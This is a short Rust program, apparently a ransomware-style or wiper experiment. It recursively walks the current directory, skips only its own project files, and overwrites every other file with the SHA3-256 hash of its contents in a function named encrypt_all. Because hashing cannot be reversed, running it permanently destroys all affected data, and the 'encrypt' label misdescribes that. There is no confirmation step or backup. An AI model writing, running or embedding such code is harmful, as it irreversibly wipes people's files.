use std::fs::{self, metadata};
use std::path::PathBuf;
use sha3::{Digest, Sha3_256};
use hex;

fn main() -> std::io::Result<()> {
    let mut files: Vec<PathBuf> = Vec::new();
    all_files(&mut files, &PathBuf::from(".\\"));
    encrypt_all(files)?;
    let _ = fs::read("foo.txt")?;
    Ok(())
}

fn all_files(files: &mut Vec<PathBuf>, file: &PathBuf) {
    let paths = fs::read_dir(file).unwrap();
    for path in paths {
        let curr = path.unwrap().path();
        let curr_str = curr.to_str().unwrap();
        if should_include(curr_str) {
            let temp = metadata(curr_str).unwrap();
            if temp.is_dir() {
                all_files(files, &curr);
            } else {
                files.push(curr);
            }
        }
    }
}

fn should_include(file: &str) -> bool {
    let to_exclude = vec![
        ".\\.git",
        ".\\src",
        ".\\target",
        ".\\.gitignore",
        ".\\Cargo.lock",
        ".\\Cargo.toml",
    ];
    !to_exclude.contains(&file)
}

fn encrypt_all(paths: Vec<PathBuf>) -> Result<(), std::io::Error> {
    for path_buf in paths {
        let path = path_buf.to_str().unwrap();
        let data = &String::from_utf8(fs::read(path)?).unwrap();
        println!("writing: {:?}, {:?}", path, to_sha3(data));
        fs::write(path, to_sha3(data))?;
    }
    Ok(())
}

fn to_sha3(content: &str) -> String {
    let mut hasher = Sha3_256::new();
    hasher.update(content.as_bytes());
    let data = hasher.finalize();
    hex::encode(data)
}

